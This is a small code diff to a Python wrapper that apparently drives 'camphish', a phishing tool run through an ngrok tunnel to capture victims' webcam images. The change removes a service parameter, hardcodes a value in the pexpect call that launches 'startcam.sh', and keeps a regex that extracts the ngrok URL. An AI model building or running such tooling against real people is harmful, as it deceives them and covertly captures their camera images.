@@ -43,7 +43,7 @@ class custom_thread(threading.Thread):
 output = Output( )
 
 
-def camphish(service: int, template: int, autthoken: str) -> str:
+def camphish(template: int, autthoken: str) -> str:
     global output
     global camphish_proc
     """
@@ -57,7 +57,7 @@ def camphish(service: int, template: int, autthoken: str) -> str:
     config.read('app.cfg')
     if platform.system( ) == 'Linux':
 
-        camphish_proc = pexpect.spawn(f'bash  startcam.sh {service} {template}')
+        camphish_proc = pexpect.spawn(f'bash  startcam.sh 1 {template}')
         camphish_proc.timeout = int(config['RUNTIME']['TIMEOUT'])
 
         compiled_ngrok_url = re.compile(r"https://[\w-]*\.ngrok\.io")
